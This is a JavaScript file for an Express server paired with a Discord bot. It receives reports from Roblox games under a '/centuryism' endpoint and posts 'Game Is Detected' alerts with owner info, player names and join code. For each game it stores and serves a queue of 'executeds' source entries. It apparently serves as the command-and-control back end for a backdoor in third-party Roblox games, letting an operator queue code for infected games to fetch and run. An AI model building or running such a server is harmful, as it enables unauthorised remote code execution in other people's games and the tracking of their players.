import { EmbedBuilder, ThreadAutoArchiveDuration, Client } from 'discord.js';
import express from 'express';
import axios from 'axios';

const app = express();
app.use(express.json());
app.use(express.urlencoded({extended: true}));

const ExpressStorage = {
    savedGames: {},
    GamesCache: {},
};

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server ${PORT} port is working`)
});

app.delete('/centuryism', async (request, response) => {
    const {KEY, PLACE_ID, SOURCE, METHOD} = request.body;

    if (!KEY || !PLACE_ID || !SOURCE) return(console.log('placeId or key not found!'));

    if (KEY == process.env.KEY) {
        if (METHOD && METHOD.toLowerCase() == 'stopproxy') {
            // if (!ExpressStorage.GamesCache[PLACE_ID]) {
            //     ExpressStorage.GamesCache[PLACE_ID] = {
            //         MessageId: ExpressStorage.savedGames[PLACE_ID].MessageId,
            //     };
            // };
            delete ExpressStorage.savedGames[PLACE_ID];
            response.status(200).send('Succesfully Delete PlaceId from SavedGames!');
        } else {
            if (ExpressStorage.savedGames[PLACE_ID] && ExpressStorage.savedGames[PLACE_ID].executeds) {
                const Filtered = ExpressStorage.savedGames[PLACE_ID].executeds.filter(obj => obj.Source !== SOURCE);
                ExpressStorage.savedGames[PLACE_ID].executeds = Filtered;
                response.status(200).send('Succesfully deleted');
            } else {
                response.status(404).send('Array not founded!');
            };
        };
    } else {
        response.status(403).send('Delete was unsuccesfull unauthorized');
    }
});

app.post('/centuryism', async (request, response) => {
    const client = await ExpressStorage.BotClient;
    const {GAME_INFO, KEY} = request.body;
    const placeId = GAME_INFO.PLACE_ID;
    const gameName = GAME_INFO.GAME_NAME;
    const jobId = GAME_INFO.JOB_ID;
    const PLAYERS = GAME_INFO.PLAYERS;

    try {
        if (!KEY || !GAME_INFO || !placeId || !gameName || !jobId) return(console.log('given variables not found', KEY, GAME_INFO, placeId, gameName, jobId));
        
        if (KEY && KEY === process.env.KEY) {
            const gameinfoPromise = new Promise(async (callback, err) => {
                const universeresponse = await axios.get(`https://apis.roblox.com/universes/v1/places/${placeId}/universe`);
                const universedata = await universeresponse.data;
                const universeId = universedata && universedata.universeId ? universedata.universeId : null;
                
                const gameinforesponse = await axios.get(`https://games.roblox.com/v1/games?universeIds=${universeId}`);
                const gameinfodata = await gameinforesponse.data.data[0];
                
                if (gameinfodata) {
                    return(callback(gameinfodata));
                } else {
                    return(err('game info data not found.'))
                }
            });

            const gameinfo = await gameinfoPromise;
            const gameImageResponse = await axios.get(`https://thumbnails.roblox.com/v1/games/icons?universeIds=${gameinfo.id}&size=150x150&format=Png&isCircular=false`);
            const gameImagedata = await gameImageResponse.data.data[0];
            const gameImageUrl = await gameImagedata.imageUrl ? gameImagedata.imageUrl : 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcThxpwPKHBP41r-01lGuLh4YE2Q7rG4EUv13A&s.png'

            const Embed = new EmbedBuilder()
                .setTitle(`**━━ Game Is Detected ━━**`)
                .setColor(0x66ff00)
                .setDescription(`# **${gameinfo.name}**`)
                .setThumbnail(gameImageUrl)
            
            const channel = await client.channels.cache.get(process.env.GAME_NOTIFY_CHANNEL);
            
            if (ExpressStorage.savedGames[placeId]) {
                Embed.addFields([
                    {   
                        name: `**━━ Game Info ━━**`, 
                        value:
                        `> **Name:** ${gameinfo.name}\n`+
                        `> **Game Link:** [Link](https://roblox.com/games/${gameinfo.rootPlaceId}/)\n`+
                        `> **Active Players:** \`${gameinfo.playing}\`\n`+
                        `> **Visits:** \`${gameinfo.visits}\`\n`
                    , inline:true
                    },
                    {
                        name: '**━━ Owner Info ━━**', 
                        value: 
                        `> **Creator Name:** \`${gameinfo.creator.name}\`\n`+ 
                        `> **Creator Id:** \`${gameinfo.creator.id}\`\n`+
                        `> **Creator Link:** [Link](https://roblox.com/users/${gameinfo.creator.id}/profile)\n`+
                        `> **Verified: **${(gameinfo.creator.hasVerifiedBadge === true) ? '# **Yes**' : 'No'}`
                        , inline:true
                    },
                    {
                        name: '**━━ Settings ━━**',
                        value:
                        `> **AvatarRigType:** ${(gameinfo.universeAvatarType == 'MorphToR15') ? 'R15' : 'R6'}\n`+
                        `> **API Enabled:** ${(gameinfo.studioAccessToApisAllowed == true) ? '# **Yes**' : 'No'}\n`+
                        `> **Copying Allowed:** ${(gameinfo.copyingAllowed == true) ? '# **Yes**' : 'No'}`
                        , inline:true
                        },
                        {
                            name: '**━━ PLAYERS ━━**',
                            value: PLAYERS.map(__user => `> **\`${__user}\`**`).join('\n')
                            , inline: false,
                        },
                        {
                            name: '**━━ Join Code ━━**',
                            value: `\`\`\`js\n`+
                            `javascript:Roblox.GameLauncher.joinGameInstance(${gameinfo.rootPlaceId}, ${jobId});\n`+
                            `\`\`\``
                            , inline: false,
                        },
                    ])
                    .setFooter({text: 'Game Has Detected (Updated)'})
                    .setTimestamp(new Date());
                
                const messageid = ExpressStorage.savedGames[placeId].MessageId || ExpressStorage.GamesCache[placeId].MessageId;
                const message = await channel.messages.fetch(messageid);
                if (!message) return(console.log('message not founded'));

                await message.edit({
                    embeds: [Embed],
                });
                
                return(console.log('Already saved data of the game'))
            } else {
                Embed.addFields([
                    {   
                        name: `**━━ Game Info ━━**`, 
                        value:
                        `> **Name:** ${gameinfo.name}\n`+
                        `> **Game Link:** [Link](https://roblox.com/games/${gameinfo.rootPlaceId}/)\n`+
                        `> **Active Players:** \`${gameinfo.playing}\`\n`+
                        `> **Visits:** \`${gameinfo.visits}\`\n`
                    , inline:true
                    },
                    {
                        name: '**━━ Owner Info ━━**', 
                        value: 
                        `> **Creator Name:** \`${gameinfo.creator.name}\`\n`+ 
                        `> **Creator Id:** \`${gameinfo.creator.id}\`\n`+
                        `> **Creator Link:** [Link](https://roblox.com/users/${gameinfo.creator.id}/profile)\n`+
                        `> **Verified: **${(gameinfo.creator.hasVerifiedBadge === true) ? '# **Yes**' : 'No'}`
                        , inline:true
                    },
                    {
                        name: '**━━ Settings ━━**',
                        value:
                        `> **AvatarRigType:** ${(gameinfo.universeAvatarType == 'MorphToR15') ? 'R15' : 'R6'}\n`+
                        `> **API Enabled:** ${(gameinfo.studioAccessToApisAllowed == true) ? '# **Yes**' : 'No'}\n`+
                        `> **Copying Allowed:** ${(gameinfo.copyingAllowed == true) ? '# **Yes**' : 'No'}`
                        , inline:true
                        },
                        {
                            name: '**━━ PLAYERS ━━**',
                            value: PLAYERS.map(__user => `> **\`${__user}\`**`).join('\n')
                            , inline: false,
                        },
                        {
                            name: '**━━ Join Code ━━**',
                            value: `\`\`\`js\n`+
                            `javascript:Roblox.GameLauncher.joinGameInstance(${gameinfo.rootPlaceId}, ${jobId});\n`+
                            `\`\`\``
                            , inline: false,
                        },
                    ])
                .setFooter({text: 'Game Has Detected'})
                .setTimestamp(new Date());
            };

            let message;

            try {
                const oldMessageId = ExpressStorage.GamesCache[placeId].MessageId ? ExpressStorage.GamesCache[placeId].MessageId : undefined;

                if (oldMessageId) {
                    message = await channel.messages.fetch(oldMessageId);
                };
            } catch {
                message = undefined;
            };

            console.log(message);

            if(!message || message === undefined) {
                message = await channel.send({
                    embeds: [Embed],
                });
            } else if (message && message.editable) {
                Embed.setFooter({text: 'Game Has Detected (Updated)'});
                await message.edit({
                    embeds: [Embed]
                });
            }; 

            console.log(message);

            ExpressStorage.savedGames[placeId] = {
                executeds: [],
                gameName: gameName,
                MessageId: message.id,
            };

            ExpressStorage.GamesCache[placeId] = {
                MessageId: message.id,
            };

            response.status(200).send('info claimed');
        } else {
            console.log('given key is false');
            response.status(403).send('Unauthorized');
        };
    } catch(e) {
        console.log(e.message);
        response.status(500).send(e.message);
    };
});

app.get('/centuryism', async (request, response) => {
    const headers = request.headers;
    const KEY = headers['x-key'];
    const PLACE_ID = headers['x-place-id'];

    if (!KEY || !PLACE_ID) return(console.log('given variable are not founded'));

    if (KEY && KEY === process.env.KEY) {
        response.json(
            (ExpressStorage.savedGames[PLACE_ID]) ? (ExpressStorage.savedGames[PLACE_ID]) : null,
        );
    } else {
        console.log('The given key is false.');
        response.status(403).send('Unauthorized');
    };
});


export {ExpressStorage};